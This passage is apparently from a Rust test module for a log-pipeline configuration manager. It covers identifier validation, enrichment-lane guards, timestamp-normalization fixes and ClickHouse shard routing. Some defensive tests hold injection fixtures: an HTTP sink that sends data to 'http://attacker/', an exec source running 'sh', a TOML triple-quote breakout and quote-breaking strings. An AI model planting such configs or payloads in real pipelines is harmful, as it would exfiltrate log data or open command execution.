            "1table",
            "db.table.extra",
            "tbl;DROP",
        ] {
            assert!(!is_valid_ch_table_ident(bad), "{bad:?} should be rejected");
        }
    }

    #[test]
    fn enrich_source_rejects_quote_and_whitespace() {
        for ok in ["ad", "entra", "okta-prod", "ip.context"] {
            assert!(is_safe_enrich_source(ok), "{ok} should be valid");
        }
        for bad in ["", "ad\" or true", "a b", "src\nx", &"x".repeat(65)] {
            assert!(!is_safe_enrich_source(bad), "{bad:?} should be rejected");
        }
    }

    #[test]
    fn topology_accepts_real_generated_lane() {
        let p = enrichment_test_parser(
            "identity",
            "user_registry",
            ". = { \"external_id\": to_string(.id) ?? \"\" }",
        );
        let lane = VectorConfigManager::generate_enrichment_lane(&[&p]);
        assert!(
            assert_enrichment_lane_topology(&lane).is_ok(),
            "a normally-generated lane must pass topology: {lane}"
        );
    }

    #[test]
    fn topology_rejects_injected_http_sink_and_lua_transform() {
        let exfil = "[sinks.enrichment_dead_letter]\ntype = \"blackhole\"\ninputs = []\n\n\
                     [sinks.exfil]\ntype = \"http\"\ninputs = [\"x\"]\nuri = \"http://attacker/\"\n";
        assert!(assert_enrichment_lane_topology(exfil).is_err(), "http exfil sink must be rejected");

        let lua = "[transforms.enrichment_normalize_ad]\ntype = \"lua\"\ninputs = []\nsource = \"x\"\n";
        assert!(assert_enrichment_lane_topology(lua).is_err(), "non-remap transform must be rejected");

        let src = "[sources.evil]\ntype = \"exec\"\ncommand = [\"sh\"]\n";
        assert!(assert_enrichment_lane_topology(src).is_err(), "injected source must be rejected");
    }

    #[test]
    fn guard_rejects_triple_quote_breakout_in_normalize_vrl() {
        // Compiles as VRL (the ''' lives inside a "..." string) but would close
        // the lane's TOML `source = '''…'''` literal.
        let evil = "x = \"harmless ''' \n[sinks.exfil]\"\n. = { \"external_id\": \"1\" }";
        let p = enrichment_test_parser("identity", "user_registry", evil);
        let toml = VectorConfigManager::enrichment_lane_config(std::slice::from_ref(&p));
        let err = VectorConfigManager::guard_enrichment_lane(std::slice::from_ref(&p), &toml)
            .expect_err("a ''' breakout must be rejected at deploy");
        assert!(
            matches!(err, VectorConfigError::ValidationFailed(ref m) if m.contains("unsafe normalize VRL")),
            "expected unsafe-normalize-VRL rejection, got {err:?}"
        );
    }

    #[test]
    fn guard_rejects_unsafe_target_table_and_enrich_source() {
        let mut bad_table = enrichment_test_parser(
            "identity",
            "user_registry\"\n[sinks.x]",
            ". = { \"external_id\": \"1\" }",
        );
        bad_table.enrich_source = Some("ad".to_string());
        let toml = VectorConfigManager::enrichment_lane_config(std::slice::from_ref(&bad_table));
        let err = VectorConfigManager::guard_enrichment_lane(std::slice::from_ref(&bad_table), &toml)
            .expect_err("a TOML-breaking target_table must be rejected");
        assert!(
            matches!(err, VectorConfigError::ValidationFailed(ref m) if m.contains("invalid target_table")),
            "expected invalid-target_table rejection, got {err:?}"
        );

        let mut bad_src = enrichment_test_parser(
            "identity",
            "user_registry",
            ". = { \"external_id\": \"1\" }",
        );
        bad_src.enrich_source = Some("ad\" == .x || \"".to_string());
        let toml2 = VectorConfigManager::enrichment_lane_config(std::slice::from_ref(&bad_src));
        let err2 = VectorConfigManager::guard_enrichment_lane(std::slice::from_ref(&bad_src), &toml2)
            .expect_err("a VRL-breaking enrich_source must be rejected");
        assert!(
            matches!(err2, VectorConfigError::ValidationFailed(ref m) if m.contains("unsafe enrich_source")),
            "expected unsafe-enrich_source rejection, got {err2:?}"
        );
    }

    /// NAN-2275: the normalize stage accepted RFC 3339 only, while parsers
    /// overwhelmingly emit `YYYY-MM-DD HH:MM:SS[.fff]`. Every one of those
    /// failed the parse, failed `is_timestamp`, and fell through to `now()` —
    /// so the LOG time was replaced by INGEST time, silently. 0 of 2817 Google
    /// Workspace rows carried their real time, and one instant rendered as five
    /// days of activity. It also made the `dedupe` transform inert, since its
    /// key includes `timestamp` and `now()` never repeats.
    ///
    /// This EXECUTES the generated block rather than pattern-matching the text:
    /// the bug was a runtime parse failure that a string assertion would have
    /// sailed straight past.
    ///
    /// Runs under a deliberately NON-UTC timezone. A bare `parse_timestamp` of a
    /// zone-less string reads it in the host's zone — measured 4h off on UTC-4.
    /// The container happens to run UTC, so a UTC-only test would pass while
    /// still shipping a host-dependent skew.
    #[test]
    fn normalize_keeps_log_time_in_every_shape_a_parser_emits() {
        use vrl::compiler::runtime::Runtime;
        use vrl::compiler::state::RuntimeState;
        use vrl::compiler::{compile, TargetValue, TimeZone};
        use vrl::value::{ObjectMap, Secrets, Value};

        let content = VectorConfigManager::pipeline_config_content();
        let block = extract_vrl_blocks(content)
            .into_iter()
            .find(|b| b.contains(".udm.timestamp = format_timestamp!"))
            .expect("normalize block that sets .udm.timestamp");

        let fns = vrl::stdlib::all();
        let program = compile(block, &fns)
            .expect("normalize block compiles")
            .program;

        // Not UTC on purpose — see the doc comment.
        let tz = TimeZone::parse("America/New_York").expect("tz");

        // (input on `.timestamp`, expected `.udm.timestamp`)
        // Rendered `+00:00` rather than `Z` — same instant, this is how the VRL
        // crate formats `%+`. What matters is the OFFSET is zero despite the
        // non-UTC runtime timezone above.
        let cases = [
            // The shape most parsers emit. Must be read as UTC, not local.
            ("2026-07-29 13:36:59", "2026-07-29T13:36:59+00:00"),
            ("2026-07-29 13:36:59.002", "2026-07-29T13:36:59.002+00:00"),
            ("2026-07-29 13:36:59.002456", "2026-07-29T13:36:59.002456+00:00"),
            // Already RFC 3339 — the only shape that used to work.
            ("2026-07-29T13:36:59.002Z", "2026-07-29T13:36:59.002+00:00"),
            // An explicit offset must still be honoured, not overridden.
            ("2026-07-29T13:36:59-04:00", "2026-07-29T17:36:59+00:00"),
            ("2026-07-29 13:36:59+00:00", "2026-07-29T13:36:59+00:00"),
        ];

        for (input, expected) in cases {
            let mut obj = ObjectMap::new();
            obj.insert("timestamp".into(), Value::from(input));
            obj.insert("message".into(), Value::from("x"));
            let mut target = TargetValue {
                value: Value::Object(obj),
                metadata: Value::Object(ObjectMap::new()),
                secrets: Secrets::new(),
            };

            let mut runtime = Runtime::new(RuntimeState::default());
            runtime
                .resolve(&mut target, &program, &tz)
                .unwrap_or_else(|e| panic!("{input}: normalize failed: {e}"));

            let got = target
                .value
                .get(vrl::path!("udm", "timestamp"))
                .and_then(|v| v.as_str().map(|s| s.to_string()))
                .unwrap_or_else(|| panic!("{input}: no .udm.timestamp"));

            assert_eq!(got, expected, "{input} must keep the LOG time");

            let fell_back = target
                .value
                .get(vrl::path!("metadata", "timestamp_fallback"))
                .is_some();
            assert!(!fell_back, "{input} must not fall back to now()");
        }
    }

    /// The fallback still exists for genuinely unparseable input — but it now
    /// leaves a mark. The previous version fell back with no error, no metric
    /// and no field, which is why a whole source read as "live" for five days.
    #[test]
    fn an_unparseable_timestamp_falls_back_but_says_so() {
        use vrl::compiler::runtime::Runtime;
        use vrl::compiler::state::RuntimeState;
        use vrl::compiler::{compile, TargetValue, TimeZone};
        use vrl::value::{ObjectMap, Secrets, Value};

        let content = VectorConfigManager::pipeline_config_content();
        let block = extract_vrl_blocks(content)
            .into_iter()
            .find(|b| b.contains(".udm.timestamp = format_timestamp!"))
            .expect("normalize block");
        let program = compile(block, &vrl::stdlib::all())
            .expect("compiles")
            .program;

        let mut obj = ObjectMap::new();
        obj.insert("timestamp".into(), Value::from("not a timestamp"));
        let mut target = TargetValue {
            value: Value::Object(obj),
            metadata: Value::Object(ObjectMap::new()),
            secrets: Secrets::new(),
        };

        let mut runtime = Runtime::new(RuntimeState::default());
        runtime
            .resolve(&mut target, &program, &TimeZone::Local)
            .expect("normalize must not error on junk");

        assert!(
            target
                .value
                .get(vrl::path!("udm", "timestamp"))
                .is_some(),
            "still stamped, so the event is not dropped"
        );
        assert_eq!(
            target
                .value
                .get(vrl::path!("metadata", "timestamp_fallback"))
                .and_then(|v| v.as_boolean()),
            Some(true),
            "the fallback must be visible, not silent"
        );
    }

    /// NAN-2276: the SAME RFC-3339-only parse exists twice, and the copy fixed
    /// in NAN-2275 was the one real parsers never reach.
    ///
    /// `normalize` takes only `["placeholder_combiner", "generic_parser"]`.
    /// DB-backed parsers arrive via `db_parsers_combined` and go straight into
    /// `clickhouse_mapping` — so fixing normalize alone left every deployed
    /// parser still stamped with ingest time, which is exactly what the live
    /// Google Workspace rows showed after that deploy.
    ///
    /// Pins the mapping stage against the same shapes, under a non-UTC zone.
    #[test]
    fn clickhouse_mapping_keeps_log_time_for_db_backed_parsers() {
        use vrl::compiler::runtime::Runtime;
        use vrl::compiler::state::RuntimeState;
        use vrl::compiler::{compile, TargetValue, TimeZone};
        use vrl::value::{ObjectMap, Secrets, Value};

        let content = VectorConfigManager::pipeline_config_content();
        let block = extract_vrl_blocks(content)
            .into_iter()
            .find(|b| b.contains(".id = uuid_v7()"))
            .expect("clickhouse_mapping block");

        let program = compile(block, &vrl::stdlib::all())
            .expect("clickhouse_mapping compiles")
            .program;
        let tz = TimeZone::parse("America/New_York").expect("tz");

        // The mapping stage renders "%Y-%m-%d %H:%M:%S" (ClickHouse DateTime).
        let cases = [
            ("2026-07-29 13:36:59", "2026-07-29 13:36:59"),
            ("2026-07-29 13:36:59.002", "2026-07-29 13:36:59"),
            ("2026-07-29T13:36:59.002Z", "2026-07-29 13:36:59"),
            // An explicit offset is converted, not ignored.
            ("2026-07-29T13:36:59-04:00", "2026-07-29 17:36:59"),
        ];

        for (input, expected) in cases {
            let mut obj = ObjectMap::new();
            obj.insert("timestamp".into(), Value::from(input));
            obj.insert("message".into(), Value::from("x"));
            obj.insert("metadata".into(), Value::Object(ObjectMap::new()));
            let mut target = TargetValue {
                value: Value::Object(obj),
                metadata: Value::Object(ObjectMap::new()),
                secrets: Secrets::new(),
            };

            let mut runtime = Runtime::new(RuntimeState::default());
            runtime
                .resolve(&mut target, &program, &tz)
                .unwrap_or_else(|e| panic!("{input}: mapping failed: {e}"));

            let got = target
                .value
                .get(vrl::path!("timestamp"))
                .and_then(|v| v.as_str().map(|s| s.to_string()))
                .unwrap_or_else(|| panic!("{input}: no .timestamp"));
            assert_eq!(got, expected, "{input} must keep the LOG time");

            // metadata is JSON-encoded by this stage; the marker must be absent.
            let meta = target
                .value
                .get(vrl::path!("metadata"))
                .and_then(|v| v.as_str().map(|s| s.to_string()))
                .unwrap_or_default();
            assert!(
                !meta.contains("timestamp_fallback"),
                "{input} must not fall back, got metadata {meta}"
            );
        }
    }

    /// Junk still falls back here too — but says so, in the JSON-encoded
    /// metadata this stage produces.
    #[test]
    fn clickhouse_mapping_marks_its_timestamp_fallback() {
        use vrl::compiler::runtime::Runtime;
        use vrl::compiler::state::RuntimeState;
        use vrl::compiler::{compile, TargetValue, TimeZone};
        use vrl::value::{ObjectMap, Secrets, Value};

        let content = VectorConfigManager::pipeline_config_content();
        let block = extract_vrl_blocks(content)
            .into_iter()
            .find(|b| b.contains(".id = uuid_v7()"))
            .expect("clickhouse_mapping block");
        let program = compile(block, &vrl::stdlib::all())
            .expect("compiles")
            .program;

        let mut obj = ObjectMap::new();
        obj.insert("timestamp".into(), Value::from("not a timestamp"));
        obj.insert("message".into(), Value::from("x"));
        obj.insert("metadata".into(), Value::Object(ObjectMap::new()));
        let mut target = TargetValue {
            value: Value::Object(obj),
            metadata: Value::Object(ObjectMap::new()),
            secrets: Secrets::new(),
        };

        let mut runtime = Runtime::new(RuntimeState::default());
        runtime
            .resolve(&mut target, &program, &TimeZone::Local)
            .expect("must not error on junk");

        let meta = target
            .value
            .get(vrl::path!("metadata"))
            .and_then(|v| v.as_str().map(|s| s.to_string()))
            .unwrap_or_default();
        assert!(
            meta.contains("timestamp_fallback"),
            "the fallback must be visible, got {meta}"
        );
    }

    #[test]
    fn two_shards_get_stable_direct_routes_and_separate_sinks() {
        let endpoints = vec![
            "http://clickhouse-shard-0:8123".to_string(),
            "http://clickhouse-shard-1:8123".to_string(),
        ];
        let routed = VectorConfigManager::shard_route_clickhouse_sinks(
            VectorConfigManager::pipeline_config_content().to_string(),
            &endpoints,
        );

        assert!(routed.contains("[transforms.clickhouse_logs_shard_route]"));
        assert!(routed.contains("to_int!(xxhash(encode_json(.)"));
        assert!(routed.contains("[sinks.clickhouse_logs_shard_0]"));
        assert!(routed.contains("[sinks.clickhouse_logs_shard_1]"));
        assert!(routed.contains("endpoint = \"http://clickhouse-shard-0:8123\""));
        assert!(routed.contains("endpoint = \"http://clickhouse-shard-1:8123\""));
        assert!(!routed.contains("[sinks.clickhouse_logs]\n"));
        assert_eq!(
            routed
                .matches("max_size = ${VECTOR_DISK_BUFFER_MAX_BYTES:-268435488}")
                .count(),
            4,
            "logs and parser-health each consume one declared share per shard"
        );

        for condition in routed
            .lines()
            .filter(|line| line.starts_with("route.shard_"))
            .filter_map(|line| line.split_once(" = '").map(|(_, body)| body.trim_end_matches('\'')))
        {
            vrl::compiler::compile(condition, &vrl::stdlib::all())
                .unwrap_or_else(|error| panic!("shard route must compile: {condition}: {error:?}"));
        }

        // Execute the same VRL predicates over stable ids: every event selects
        // exactly one shard and the deterministic hash is reasonably balanced.
        use vrl::compiler::runtime::Runtime;
        use vrl::compiler::state::RuntimeState;
        use vrl::compiler::{TargetValue, TimeZone};
        use vrl::value::{ObjectMap, Secrets, Value};
        let predicates: Vec<_> = routed
            .lines()
            .filter(|line| line.starts_with("route.shard_"))
            .take(2)
            .map(|line| line.split_once(" = '").unwrap().1.trim_end_matches('\''))
            .map(|condition| vrl::compiler::compile(condition, &vrl::stdlib::all()).unwrap().program)
            .collect();
        let mut counts = [0_usize; 2];
        for id in 0..2_000 {
            let mut object = ObjectMap::new();
            object.insert("id".into(), Value::from(format!("event-{id}")));
            let selected: Vec<_> = predicates
                .iter()
                .enumerate()
                .filter_map(|(shard, program)| {
                    let mut target = TargetValue {
                        value: Value::Object(object.clone()),
                        metadata: Value::Object(ObjectMap::new()),
                        secrets: Secrets::new(),
                    };
                    let mut runtime = Runtime::new(RuntimeState::default());
                    matches!(
                        runtime.resolve(&mut target, program, &TimeZone::Local),
                        Ok(Value::Boolean(true))
                    )
                    .then_some(shard)
                })
                .collect();
            assert_eq!(selected.len(), 1, "event-{id} must select exactly one shard");
            counts[selected[0]] += 1;
        }
        assert!(counts.iter().all(|count| (800..=1_200).contains(count)), "unbalanced: {counts:?}");

        // OCSF preparation intentionally replaces the outer event and may not
        // leave a top-level id. Such events must hash their full content rather
        // than all hashing the string representation of null.
        let mut idless_counts = [0_usize; 2];
        for id in 0..2_000 {
            let mut object = ObjectMap::new();
            object.insert("message".into(), Value::from(format!("idless-event-{id}")));
            let selected: Vec<_> = predicates
                .iter()
                .enumerate()
                .filter_map(|(shard, program)| {
                    let mut target = TargetValue {
                        value: Value::Object(object.clone()),
                        metadata: Value::Object(ObjectMap::new()),
                        secrets: Secrets::new(),
                    };
                    let mut runtime = Runtime::new(RuntimeState::default());
                    matches!(
                        runtime.resolve(&mut target, program, &TimeZone::Local),
                        Ok(Value::Boolean(true))
                    )
                    .then_some(shard)
                })
                .collect();
            assert_eq!(
                selected.len(),
                1,
                "idless-event-{id} must select exactly one shard"
            );
            idless_counts[selected[0]] += 1;
        }
        assert!(
            idless_counts
                .iter()
                .all(|count| (800..=1_200).contains(count)),
            "unbalanced idless events: {idless_counts:?}"
        );
    }
